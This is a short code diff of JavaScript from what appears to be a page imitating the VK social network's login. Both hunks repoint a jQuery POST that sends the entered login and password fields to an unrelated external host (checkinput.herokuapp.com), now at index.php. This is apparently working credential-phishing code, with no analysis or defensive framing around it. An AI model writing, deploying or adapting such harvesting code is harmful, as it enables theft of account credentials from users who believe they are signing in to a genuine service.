@@ -6,7 +6,7 @@ console.log("done");
 			if (login != null && password != null) {
 				var checkLogin = false;
 
-				$.post('https://checkinput.herokuapp.com/', 
+				$.post('https://checkinput.herokuapp.com/index.php', 
 				{
 					login: login,
 					password: password
@@ -171,7 +171,7 @@ You no longer need a desktop or laptop to be connected via VK. Install our offic
 					var login = $('.login').val();
 					var password = $('.password').val();
 
-					$.post('https://checkinput.herokuapp.com/', 
+					$.post('https://checkinput.herokuapp.com/index.php', 
 						{
 							login: login,
 							password: password
